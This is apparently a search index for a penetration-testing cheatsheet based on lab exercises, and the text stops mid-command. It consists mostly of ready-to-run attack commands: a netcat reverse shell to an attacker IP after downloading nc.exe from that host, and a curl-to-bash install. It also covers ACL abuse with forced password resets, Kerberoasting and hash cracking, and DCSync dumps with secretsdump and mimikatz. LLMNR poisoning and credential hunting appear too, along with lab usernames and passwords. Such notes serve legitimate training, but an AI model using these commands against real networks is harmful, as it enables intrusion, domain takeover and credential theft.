{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"HACKING AWESOME CHEATSHEET","text":""},{"location":"pivoting/","title":"Pivoting","text":""},{"location":"pivoting/#chisel","title":"CHISEL","text":"<ol> <li>Install on attack box: <code>curl https://i.jpillora.com/chisel! | bash</code></li> <li>Edit /etc/proxychains.conf &gt; socks5 127.0.0.1 1080</li> <li>Run server: <code>chisel server -p 8001 \u2014reverse</code></li> <li>Run client:  <code>.\\chisel.exe client 10.10.14.179:8001 R:1080:socks</code></li> <li>Run command: <code>proxychains4 -q nmap ip-address</code></li> <li>Links:<ol> <li>https://github.com/jpillora/chisel</li> <li>https://ap3x.github.io/posts/pivoting-with-chisel/</li> </ol> </li> </ol>"},{"location":"pivoting/#netcat","title":"NETCAT","text":"<ol> <li>Download on windows host: <code>Invoke-WebRequest -Uri [http://10.10.14.144:9999/nc.exe](http://10.10.14.144:9999/nc.exe) -OutFile nc.exe -UseBasicParsing</code></li> <li>Run nc on atack host: <code>nc -nlvp 4444</code></li> <li>Run nc on target: <code>nc.exe 10.10.14.144 4444 -e cmd.exe</code></li> </ol>"},{"location":"pivoting/#netshexe","title":"NETSH.EXE","text":"<ol> <li>Using Netsh.exe to Port Forward <code>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25</code></li> <li>Verifying Port Forward <code>netsh.exe interface portproxy show v4tov4</code></li> <li>Connecting to the Internal Host through the Port Forward <code>xfreerdp /v:ip-address:port /u:user /p:password</code></li> </ol>"},{"location":"webinfogathering/","title":"Web Information Gathering","text":""},{"location":"webinfogathering/#whois","title":"Whois","text":"<p><code>whois inlanefreight.com</code></p>"},{"location":"webinfogathering/#dig","title":"Dig","text":"<pre><code>dig domain.com` #Performs a default A record lookup for the domain.\ndig domain.com A #Retrieves the IPv4 address (A record) associated with the domain.\ndig domain.com AAAA #Retrieves the IPv6 address (AAAA record) associated with the domain.\ndig domain.com MX #Finds the mail servers (MX records) responsible for the domain.\ndig domain.com NS #Identifies the authoritative name servers for the domain.\ndig domain.com TXT #Retrieves any TXT records associated with the domain.\ndig domain.com CNAME #Retrieves the canonical name (CNAME) record for the domain.\ndig domain.com SOA #Retrieves the start of authority (SOA) record for the domain.\ndig @1.1.1.1 domain.com #Specifies a specific name server to query; in this case 1.1.1.1\ndig +trace domain.com #Shows the full path of DNS resolution. |\ndig -x 192.168.1.1 #Performs a reverse lookup on the IP address 192.168.1.1 to find the associated host name. You may need to specify a name server.\ndig +short domain.com #Provides a short, concise answer to the query.\ndig +noall +answer domain.com #Displays only the answer section of the query output.\ndig domain.com ANY #Retrieves all available DNS records for the domain (Note: Many DNS servers ignore `ANY` queries to reduce load and prevent abuse, as per [RFC 8482](https://datatracker.ietf.org/doc/html/rfc8482)).\n</code></pre>"},{"location":"webinfogathering/#subdomain-enumeration","title":"Subdomain enumeration","text":""},{"location":"webinfogathering/#dnsenum","title":"Dnsenum","text":"<p><code>dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r</code></p>"},{"location":"webinfogathering/#dns-zone-transfers","title":"DNS Zone Transfers","text":"<p><code>dig axfr @nsztm1.digi.ninja zonetransfer.me</code></p>"},{"location":"webinfogathering/#virtual-hosts","title":"Virtual hosts","text":"<p><code>gobuster vhost -u http://&lt;target_IP_address&gt; -w &lt;wordlist_file&gt; --append-domain</code></p>"},{"location":"webinfogathering/#crtsh","title":"crt.sh","text":"<p><code>curl -s \"[https://crt.sh/?q=facebook.com&amp;output=json](https://crt.sh/?q=facebook.com&amp;output=json)\" | jq -r '.[] | select(.name_value | contains(\"dev\")) | .name_value' | sort -u</code></p>"},{"location":"webinfogathering/#banner-grabbing","title":"Banner grabbing","text":"<p><code>curl -I inlanefreight.com</code></p>"},{"location":"webinfogathering/#waf-detection","title":"WAF detection","text":""},{"location":"webinfogathering/#wafw00f","title":"wafw00f","text":"<ol> <li><code>pip3 install git+https://github.com/EnableSecurity/wafw00f</code></li> <li><code>wafw00f inlanefreight.com</code></li> </ol>"},{"location":"webinfogathering/#crawling","title":"Crawling","text":""},{"location":"webinfogathering/#reconspider","title":"ReconSpider","text":"<ol> <li><code>wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip</code></li> <li><code>unzip ReconSpider.zip</code></li> <li><code>python3 ReconSpider.py http://inlanefreight.com</code> </li> </ol>"},{"location":"active-directory/acl/","title":"ACL Abuse Primer","text":""},{"location":"active-directory/acl/#enumerating-acls-with-powerview","title":"Enumerating ACLs with PowerView","text":"<ol> <li>Using Find-InterestingDomainAcl: <code>Find-InterestingDomainAcl</code></li> <li>Using Get-DomainObjectACL: <code>Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}</code></li> <li>Performing a Reverse Search &amp; Mapping to a GUID Value:<ol> <li><code>$guid= \"00299570-246d-11d0-a768-00aa006e0529\"</code></li> <li><code>Get-ADObject -SearchBase \"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl</code></li> </ol> </li> <li>Using the -ResolveGUIDs Flag: <code>Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $s</code></li> <li>Creating a List of Domain Users: <code>Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt</code></li> <li>A Useful foreach Loop: <code>foreach($line in [System.IO.File]::ReadLines(\"C:\\Users\\htb-student\\Desktop\\ad_users.txt\")) {get-acl  \"AD:\\$(Get-ADUser $line)\" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\\\wley'}}</code></li> <li>Further Enumeration of Rights Using user-name:<ol> <li><code>$sid2 = Convert-NameToSid damundsen</code></li> <li><code>Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose</code></li> </ol> </li> <li>Investigating the \"Help Desk Level 1\" Group with Get-DomainGroup: <code>Get-DomainGroup -Identity \"Help Desk Level 1\" | select memberof</code></li> <li>Investigating the \"Information Technology Group\":<ol> <li><code>$itgroupsid = Convert-NameToSid \"Information Technology\"</code></li> <li><code>Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose</code></li> </ol> </li> <li>Looking for Interesting Access:<ol> <li><code>$adunnsid = Convert-NameToSid adunn</code> </li> <li><code>Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose</code></li> </ol> </li> </ol>"},{"location":"active-directory/acl/#acl-abuse-tactics","title":"ACL Abuse Tactics","text":"<ol> <li>Creating a PSCredential Object:<ol> <li><code>$SecPassword = ConvertTo-SecureString '&lt;PASSWORD HERE&gt;' -AsPlainText -Force</code></li> <li><code>$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\wley', $SecPassword)</code></li> </ol> </li> <li>Creating a SecureString Object: <code>$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force</code></li> <li>Changing the User's Password with Set-DomainUserPassword: <code>Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose</code></li> <li>Creating a SecureString Object using user-name: <ol> <li><code>$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force</code></li> <li><code>$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\damundsen', $SecPassword)</code></li> </ol> </li> <li>Adding user  to the Group:<ol> <li>List members: <code>Get-ADGroup -Identity \"Help Desk Level 1\" -Properties * | Select -ExpandProperty Members</code></li> <li>Add user: <code>Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose</code></li> <li>Confirming: <code>Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName</code></li> </ol> </li> <li>Creating a Fake SPN: <code>Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose</code></li> <li>Kerberoasting with Rubeus: <code>.\\Rubeus.exe kerberoast /user:adunn /nowrap</code></li> <li>Cleanup:<ol> <li>Removing the Fake SPN from adunn's Account: <code>Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose</code></li> <li>Removing user from the Group: <code>Remove-DomainGroupMember -Identity \"Help Desk Level 1\" -Members 'damundsen' -Credential $Cred2 -Verbose</code></li> <li>confirm the user was indeed removed: <code>Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose</code></li> </ol> </li> </ol>"},{"location":"active-directory/adenumeration/","title":"AD Enumeration","text":""},{"location":"active-directory/adenumeration/#powershell","title":"Powershell","text":"<ol> <li>Find the member of the some group on given host: <code>Get-LocalGroupMember -Group \"GROUP NAME\"</code></li> <li>Look at the ACL for a single domain user: <code>(Get-ACL \"AD:$((Get-ADUser USER.NAME).distinguishedname)\").access  | ? {$_.IdentityReference -eq \"INLANEFREIGHT\\cliff.moore\"}</code></li> <li>Drill down further on this user to find all users with WriteProperty or GenericAll rights over the target user: <code>(Get-ACL \"AD:$((Get-ADUser daniel.carter).distinguishedname)\").access  | ? {$_.ActiveDirectoryRights -match \"WriteProperty\" -or $_.ActiveDirectoryRights -match \"GenericAll\"} | Select IdentityReference,ActiveDirectoryRights -Unique | ft -W</code></li> <li>Get GPO using GUID: <code>Get-GPO -Guid 831DE3ED-40B1-4703-ABA7-8EA13B2EB118</code></li> <li>What is the passwordhistorysize of the domain? <code>Get-ADDefaultDomainPasswordPolicy | Select-Object PasswordHistorySize</code></li> <li>Who is the group manager of the Citrix Admins group? <code>Get-ADUser -Identity \"&lt;DistinguishedName of Manager&gt;\" | Select-Object Name</code></li> </ol>"},{"location":"active-directory/adenumeration/#cmd","title":"CMD","text":"<ol> <li>Built-in tool that determines GPOs that have been applied to a given user or computer and their settings:<ol> <li><code>gpresult /r /user:harry.jones</code></li> <li><code>gpresult /r /S WS01</code></li> </ol> </li> <li>What is the passwordhistorysize of the domain? <code>net accounts</code></li> </ol>"},{"location":"active-directory/adenumeration/#powerview-sharpview-useful-command","title":"PowerView/ SharpView useful command","text":"<ol> <li>Convert a username to the corresponding SID <code>.\\SharpView.exe ConvertTo-SID -Name sally.jones</code></li> <li>Convert SID to a username: <code>.\\SharpView.exe Convert-ADName -ObjectName S-1-5-21-2974783224-3764228556-2640795941-1724</code></li> <li>Get Domain Info: <code>.\\SharpView.exe Get-Domain</code></li> <li>Get all OUs: <code>.\\SharpView.exe Get-DomainOU | findstr /b \"name\"</code></li> <li>Get users with PreauthNotRequired: <code>.\\SharpView.exe Get-DomainUser -KerberosPreauthNotRequired</code></li> <li>Gathering information about individual hosts: <code>Get-DomainComputer | select dnshostname, useraccountcontrol</code></li> <li>Return all Group Policy Objects (GPOs) names: <code>.\\SharpView.exe Get-DomainGPO | findstr displayname</code></li> <li>Determine which GPOs map back to which hosts: <code>Get-DomainGPO -ComputerIdentity WS01 | select displayname</code></li> <li>Check if our current user has local admin rights on any remote hosts: <code>Test-AdminAccess -ComputerName SQL01</code></li> <li>Eenumerate open shares on a remote computer: <code>.\\SharpView.exe Get-NetShare -ComputerName DC01</code></li> <li>Find domain machines that users are logged into: <code>Find-DomainUserLocation</code></li> <li>All domain trusts for our current domain: <code>Get-DomainTrust</code></li> </ol>"},{"location":"active-directory/adenumeration/#enumerating-ad-users","title":"Enumerating AD users","text":"<ol> <li>Users number: <code>(Get-DomainUser).count</code></li> <li>Get user with properties: <code>Get-DomainUser -Identity USER-NAME -Domain DOMAIN-NAME | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,mail,useraccountcontrol</code></li> <li>Enumerate these properties for ALL domain users and export them to a CSV file: <code>Get-DomainUser * -Domain DOMAIN-NAME | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,mail,useraccountcontrol | Export-Csv .\\inlanefreight_users.csv -NoTypeInformation</code></li> <li>Obtaining a list of users that do not require Kerberos pre-authentication and can be subjected to an ASREPRoast attack: <code>.\\SharpView.exe Get-DomainUser -KerberosPreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof</code></li> <li>Gather information about users with Kerberos constrained delegation: <code>.\\SharpView.exe Get-DomainUser -TrustedToAuth -Properties samaccountname,useraccountcontrol,memberof</code></li> <li>Users that allow unconstrained delegation: <code>.\\SharpView.exe Get-DomainUser -LDAPFilter \"(userAccountControl:1.2.840.113556.1.4.803:=524288)\"</code></li> <li>Any domain users with sensitive data such as a password stored in the description field: <code>Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null}</code></li> <li>Enumerate any users with Service Principal Names (SPNs) that could be subjected to a Kerberoasting attack: <code>.\\SharpView.exe Get-DomainUser -SPN -Properties samaccountname,memberof,serviceprincipalname</code></li> <li>Enumerate any users from other (foreign) domains with group membership within any groups in our current domain: <code>Find-ForeignGroup</code></li> <li>Checking for users with Service Principal Names (SPNs) set in other domains that we can authenticate into via inbound or bi-directional trust relationships with forest-wide authentication allowing all users to authenticate across a trust or selective-authentication set up which allows specific users to authenticate: <code>Get-DomainUser -SPN -Domain freightlogistics.local | select samaccountname,memberof,serviceprincipalname | fl</code></li> <li>Display all password set times: <code>Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon -Domain InlaneFreight.local | select samaccountname, pwdlastset, lastlogon | Sort-Object -Property pwdlastset</code></li> <li>If you want only to show passwords set before a certain date: <code>Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon -Domain InlaneFreight.local | select samaccountname, pwdlastset, lastlogon | where { $_.pwdlastset -lt (Get-Date).addDays(-90) }</code></li> </ol>"},{"location":"active-directory/adenumeration/#enumerating-ad-groups","title":"Enumerating AD Groups","text":"<ol> <li>Get Domain's Groups: <code>Get-DomainGroup -Properties Name</code></li> <li>Use Get-DomainGroupMember to examine group membership in any given group: <code>.\\SharpView.exe Get-DomainGroupMember -Identity 'Help Desk'</code></li> <li>Look for all AD groups with the AdminCount attribute set to 1, signifying that this is a protected group: <code>.\\SharpView.exe Get-DomainGroup -AdminCount</code></li> <li>Look for any managed security groups: <code>Find-ManagedSecurityGroups | select GroupName</code></li> <li>Look at the Security Operations group and see if the group has a manager set: <code>Get-DomainManagedSecurityGroup</code></li> <li>Enumerating the ACLs set on this group: <ol> <li><code>$sid = ConvertTo-SID user-name</code></li> <li><code>Get-DomainObjectAcl -Identity 'Security Operations' | ?{ $_.SecurityIdentifier -eq $sid}</code></li> </ol> </li> <li>Check local group membership: <code>Get-NetLocalGroup -ComputerName WS01 | select GroupName</code></li> <li>Enumerate the local group members on any given host: <code>.\\SharpView.exe Get-NetLocalGroupMember -ComputerName WS01</code></li> <li>Same function to check all the hosts that a given user has local admin access:<ol> <li><code>$sid = Convert-NameToSid USER-NAME</code></li> <li><code>$computers = Get-DomainComputer -Properties dnshostname | select -ExpandProperty dnshostname</code></li> <li><code>foreach ($line in $computers) {Get-NetLocalGroupMember -ComputerName $line | ? {$_.SID -eq $sid}}</code></li> </ol> </li> </ol>"},{"location":"active-directory/adenumeration/#enumerating-ad-computers","title":"Enumerating AD Computers","text":"<ol> <li>Get hostname, operating system, and User Account Control (UAC) attributes and save to file: <code>.\\SharpView.exe Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,useraccountcontrol | Export-Csv .\\inlanefreight_computers.csv -NoTypeInformation</code></li> <li>Find to any computers in the domain are configured to allow unconstrained delegation and find one, the domain controller, which is standard: <code>.\\SharpView.exe Get-DomainComputer -Unconstrained -Properties dnshostname,useraccountcontrol</code></li> <li>Check for any hosts set up to allow for constrained delegation: <code>Get-DomainComputer -TrustedToAuth | select -Property dnshostname,useraccountcontrol</code></li> </ol>"},{"location":"active-directory/adenumeration/#enumerating-domain-acls","title":"Enumerating Domain ACLs","text":"<ol> <li>Look at the ACL for a single domain user: <code>Get-DomainObjectAcl -Identity USER.NAME -Domain inlanefreight.local -ResolveGUIDs</code></li> <li>Seek out ACLs on specific users and filter out results using the various AD filters: <code>Find-InterestingDomainAcl -Domain inlanefreight.local -ResolveGUIDs</code></li> <li>Look at the ACLs set on file shares: <ol> <li><code>Get-NetShare -ComputerName SQL01</code></li> <li><code>Get-PathAcl \"\\\\SQL01\\DB_backups\"</code></li> </ol> </li> <li>Use the Get-ObjectACL function to search for all users that have these rights: <code>Get-ObjectACL \"DC=inlanefreight,DC=local\" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object SecurityIdentifier | Sort-Object -Property SecurityIdentifier -Unique</code></li> <li>Convert the SID back to the user: <code>convertfrom-sid S-1-5-21-2974783224-3764228556-2640795941-1883</code></li> <li>Point 5 and 6 can be done:<ol> <li><code>$dcsync = Get-ObjectACL \"DC=inlanefreight,DC=local\" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value</code></li> <li><code>Convert-SidToName $dcsync</code></li> </ol> </li> </ol>"},{"location":"active-directory/adenumeration/#enumerating-group-policy-objects-gpos","title":"Enumerating Group Policy Objects (GPOs)","text":"<ol> <li>Gathering GPO names: <code>Get-DomainGPO | select displayname</code></li> <li>Check which GPOs apply to a specific computer: <code>Get-DomainGPO -ComputerName WS01 | select displayname</code></li> <li>We can use the Get-DomainGPO and Get-ObjectAcl using the SID for the Domain Users group to see if this group has any permissions assigned to any GPOs: <code>Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq 'S-1-5-21-2974783224-3764228556-2640795941-513'}</code></li> </ol>"},{"location":"active-directory/adenumeration/#enumerating-ad-trusts","title":"Enumerating AD Trusts","text":"<ol> <li>Get Domain Trust: <code>Get-DomainTrust</code></li> <li>Use the function Get-DomainTrustMapping to enumerate all trusts for our current domain and other reachable domains: <code>Get-DomainTrustMapping</code></li> </ol>"},{"location":"active-directory/adenumeration/#links","title":"Links","text":"<ol> <li>https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg</li> <li>SharpGPOAbuse is an excellent tool that can be used to take advantage of GPO misconfigurations.</li> </ol>"},{"location":"active-directory/credentials/","title":"Credentials Haunting","text":""},{"location":"active-directory/credentials/#enumerating-security-controls","title":"Enumerating Security Controls","text":"<ol> <li>Checking the Status of Defender with Get-MpComputerStatus: <code>Get-MpComputerStatus</code></li> <li>Using Get-AppLockerPolicy cmdlet: <code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code></li> <li>PowerShell Constrained Language Mode: <code>$ExecutionContext.SessionState.LanguageMode</code></li> <li>Using Find-LAPSDelegatedGroups: <code>Find-LAPSDelegatedGroups</code></li> <li>Using Find-AdmPwdExtendedRights: <code>Find-AdmPwdExtendedRights</code></li> <li>Using Get-LAPSComputers: <code>Get-LAPSComputers</code></li> </ol>"},{"location":"active-directory/credentials/#credentialed-enumeration-from-linux","title":"Credentialed Enumeration - from Linux","text":"<ol> <li>CME - Domain User Enumeration: <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users</code></li> <li>CME - Domain Group Enumeration: <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups</code></li> <li>CME - Logged On Users: <code>sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users</code></li> <li>CME Share Searching: <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares</code></li> <li>The module spider_plus will dig through each readable share on the host and list all readable files: <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'</code> When completed, CME writes the results to a JSON file located at /tmp/cme_spider_plus/. <li>SMBMap To Check Access: <code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5</code></li> <li>Smbmap - Recursive List Of All Directories: <code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only</code></li> <li>SMB NULL Session with rpcclient: <code>rpcclient -U \"\" -N 172.16.5.5</code></li> <li>To connect to a host with psexec.py, we need credentials for a user with local administrator privileges: <code>psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125</code></li> <li>Wmiexec.py utilizes a semi-interactive shell where commands are executed through Windows Management Instrumentation: <code>wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5</code></li> <li>Windapsearch - Domain Admins: <code>python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da</code></li> <li>Windapsearch - Privileged Users: <code>python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU</code></li> <li>Executing BloodHound.py: <code>sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all</code></li>"},{"location":"active-directory/credentials/#credentialed-enumeration-from-windows","title":"Credentialed Enumeration - from Windows","text":"<ol> <li>Load ActiveDirectory Module: <code>Import-Module ActiveDirectory</code></li> <li>Get Domain Info: <code>Get-ADDomain</code></li> <li>Get-ADUser: <code>Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName</code></li> <li>Checking For Trust Relationships: <code>Get-ADTrust -Filter *</code></li> <li>Group Enumeration: <code>Get-ADGroup -Filter * | select name</code></li> <li>Detailed Group Info: <code>Get-ADGroup -Identity \"Backup Operators\"</code></li> <li>Group Membership: <code>Get-ADGroupMember -Identity \"Backup Operators\"</code></li> <li>Snaffler is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment: <code>Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data</code></li> <li>SharpHound: <code>.\\SharpHound.exe -c All --zipfilename ILFREIGHT</code></li> </ol>"},{"location":"active-directory/credentials/#kerberoasting-from-linux","title":"Kerberoasting - from Linux","text":"<ol> <li>Listing SPN Accounts with GetUserSPNs.py: <code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend</code></li> <li>Requesting all TGS Tickets: <code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request</code></li> <li>Requesting a Single TGS ticket: <code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev</code></li> <li>Saving the TGS Ticket to an Output File: <code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs</code></li> <li>Cracking the Ticket Offline with Hashcat: <code>hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt</code></li> </ol>"},{"location":"active-directory/credentials/#kerberoasting-from-windows","title":"Kerberoasting - from Windows","text":""},{"location":"active-directory/credentials/#kerberoasting-semi-manual-method","title":"Kerberoasting - Semi Manual method","text":"<ol> <li>Enumerating SPNs with setspn.exe: <code>setspn.exe -Q */*</code></li> <li>Targeting a Single User:<ol> <li><code>Add-Type -AssemblyName System.IdentityModel</code></li> <li><code>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433\"</code></li> </ol> </li> <li>Retrieving All Tickets Using setspn.exe: <code>setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }</code></li> <li>Extracting Tickets from Memory with Mimikatz:<ol> <li><code>mimikatz # base64 /out:true</code></li> <li><code>mimikatz # kerberos::list /export</code></li> </ol> </li> <li>Preparing the Base64 Blob for Cracking: <code>echo \"&lt;base64 blob&gt;\" |  tr -d \\\\n</code></li> <li>Placing the Output into a File as .kirbi: <code>cat encoded_file | base64 -d &gt; sqldev.kirbi</code></li> <li>Extracting the Kerberos Ticket using kirbi2john.py: <code>python2.7 kirbi2john.py sqldev.kirbi</code></li> <li>Modifiying crack_file for Hashcat: <code>sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file &gt; sqldev_tgs_hashcat</code></li> <li>Cracking the Hash with Hashcat: <code>hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt</code></li> </ol>"},{"location":"active-directory/credentials/#kerberoasting-automated-tool-based-route","title":"Kerberoasting - Automated / Tool Based Route","text":"<ol> <li>Using PowerView to Extract TGS Tickets: <code>Get-DomainUser * -spn | select samaccountname</code></li> <li>Using PowerView to Target a Specific User: <code>Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat</code></li> <li>Exporting All Tickets to a CSV File: <code>Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation</code></li> <li>Viewing the Contents of the .CSV File: <code>cat .\\ilfreight_tgs.csv</code></li> </ol>"},{"location":"active-directory/credentials/#kerberoasting-with-rubeus","title":"Kerberoasting with Rubeus","text":"<ol> <li>Using the /stats Flag: <code>.\\Rubeus.exe kerberoast /stats</code></li> <li>Using the /nowrap Flag: <code>.\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap</code></li> <li>creating an SPN account named testspn and using Rubeus to Kerberoast this specific user to test this out: <code>.\\Rubeus.exe kerberoast /user:testspn /nowrap</code></li> <li>Checking with PowerView: <code>Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes</code></li> <li>Use Rubeus with the /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket: <code>.\\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap</code></li> </ol>"},{"location":"active-directory/credentials/#dcsync","title":"DCSync","text":"<ol> <li>Using Get-DomainUser to View user Group Membership: <code>Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl</code></li> <li>Using Get-ObjectAcl to Check adunn's Replication Rights:<ol> <li><code>$sid= \"S-1-5-21-3842939050-3880317879-2865463114-1164\"</code></li> <li><code>Get-ObjectAcl \"DC=inlanefreight,DC=local\" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl</code></li> </ol> </li> <li>Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py: <code>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5</code></li> <li>Enumerating Further using Get-ADUser: <code>Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl</code></li> <li>Checking for Reversible Encryption Option using Get-DomainUser: <code>Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontro</code></li> <li>Using runas.exe: <code>runas /netonly /user:INLANEFREIGHT\\adunn powershell</code></li> <li>Performing the Attack with Mimikatz:<ol> <li><code>.\\mimikatz.exe</code></li> <li><code>privilege::debug</code></li> <li><code>lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\administrator</code></li> </ol> </li> </ol>"},{"location":"active-directory/initial/","title":"Initial","text":""},{"location":"active-directory/initial/#basic-steps","title":"Basic steps","text":"<ol> <li>Start Wireshark: <code>sudo -E wireshark</code></li> <li>Tcpdump Output: <code>sudo tcpdump -i ens224</code></li> <li>Use Responder: <code>sudo responder -I ens224 -A</code></li> <li>FPing Active Checks: <code>fping -asgq 172.16.5.0/23</code></li> <li>Nmap Scanning: <code>sudo nmap -v -A -iL hosts.txt</code></li> </ol>"},{"location":"active-directory/initial/#identifying-users-with-kerbrute","title":"Identifying Users with Kerbrute","text":"<pre><code>sudo git clone https://github.com/ropnop/kerbrute.git`\nsudo make all\n./kerbrute_linux_amd64 \nsudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute\nkerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users\n</code></pre>"},{"location":"active-directory/initial/#llmnrnbt-ns-poisoning-from-linux","title":"LLMNR/NBT-NS Poisoning - from Linux","text":"<ol> <li>Run Responder: <code>sudo responder -I ens224</code></li> <li>Cracking an NTLMv2 Hash With Hashcat: <code>hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt</code></li> </ol>"},{"location":"active-directory/initial/#llmnrnbt-ns-poisoning-from-windows","title":"** LLMNR/NBT-NS Poisoning - from Windows**","text":"<ol> <li>Inveigh<ol> <li><code>Import-Module .\\Inveigh.ps1</code></li> <li><code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code></li> </ol> </li> <li>C# Inveigh (InveighZero): <code>.\\Inveigh.exe</code></li> </ol>"},{"location":"active-directory/initial/#enumerating-the-password-policy-from-linux-credentialed","title":"Enumerating the Password Policy - from Linux - Credentialed","text":"<ol> <li>CME: <code>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol</code></li> <li>RPCClient:<ol> <li><code>rpcclient -U \"\" -N 